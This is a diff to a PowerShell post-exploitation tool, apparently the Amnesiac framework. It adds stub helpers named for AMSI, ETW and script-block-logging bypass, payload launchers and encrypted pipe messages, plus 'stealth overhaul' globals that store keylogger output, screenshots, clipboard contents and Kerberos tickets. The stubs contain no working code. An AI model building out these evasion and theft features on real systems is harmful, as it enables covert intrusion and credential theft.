@@ -1,4 +1,29 @@
-﻿function Amnesiac {
+﻿# ============================================================
+# AmnesiacLoader — pre-built C# assembly (base64)
+# Updated by AmnesiacLoader/Build.ps1
+# ============================================================
+$AmnesiacLoaderB64 = ""  # placeholder — populated by Build.ps1
+
+# ============================================================
+# MODULE-LEVEL HELPERS
+# Defined outside Amnesiac {} so they are directly importable
+# for testing (dot-source Amnesiac.ps1, call helpers directly).
+# ============================================================
+
+function Get-AmsiBypassSnippet  { param([string]$Technique) throw "Not implemented" }
+function Get-EtwBypassSnippet   { param([string]$Technique) throw "Not implemented" }
+function Get-SblBypassSnippet   { throw "Not implemented" }
+function New-PayloadScript      { param([switch]$IsServer,[string]$ComputerName,[string]$PipeName,[string]$SID,[hashtable]$Config) throw "Not implemented" }
+function Get-PayloadLauncher    { param([string]$Script,[string]$Launcher) throw "Not implemented" }
+function Initialize-DiskStructure {}
+function Initialize-ToolCache   {}
+function Send-Module            { param([string]$ToolName,$Writer,$Reader) throw "Not implemented" }
+function Test-NetworkLogonToken { return $false }
+function Protect-PipeMessage    { param([string]$PlainText,[byte[]]$Key) throw "Not implemented" }
+function Unprotect-PipeMessage  { param([string]$CipherB64,[byte[]]$Key) throw "Not implemented" }
+function Show-OpsecBanner       {}
+
+function Amnesiac {
 
 	<#
 	.SYNOPSIS
@@ -81,7 +106,34 @@
 	$global:Message = $null
 	$global:RestoreTimeout = $False
 	$global:ScanModer = $False
-	
+
+    # ---- Stealth overhaul globals ----
+    $global:DiskMode       = $false
+    $global:AmnesiacArtifacts = @{
+        Keylogger   = [System.Collections.Generic.List[string]]::new()
+        Screenshots = [System.Collections.Generic.List[byte[]]]::new()
+        Downloads   = [System.Collections.Generic.Dictionary[string,byte[]]]::new()
+        Clipboard   = [System.Collections.Generic.List[string]]::new()
+        TGTs        = [System.Collections.Generic.List[string]]::new()
+    }
+    $global:ToolCache      = @{}
+    $global:EndMarker      = -join ((65..90 + 97..122) | Get-Random -Count 8 | % {[char]$_})
+    $global:BufferSize     = @(512, 1024, 2048, 4096) | Get-Random
+    $global:PayloadConfig  = @{
+        Amsi        = 'pageguard'
+        Etw         = 'provider'
+        Sbl         = $true
+        Launcher    = 'ps'
+        Encoding    = 'gzip'
+        Jitter      = 'medium'
+        Obfuscation = 'high'
+        Keys        = @{}
+    }
+    $global:EngagementProfile = $null
+    $global:PSKPhrase         = $null
+    $global:PSKBytes          = $null   # 16-byte derived key; $null = unset
+    # ---- End stealth overhaul globals ----
+
 	if(!$ScanMode){$global:Message = " [+] Welcome to Amnesiac. Type 'help' to list/hide available commands"}
 	
 	$ShowSessions = $True
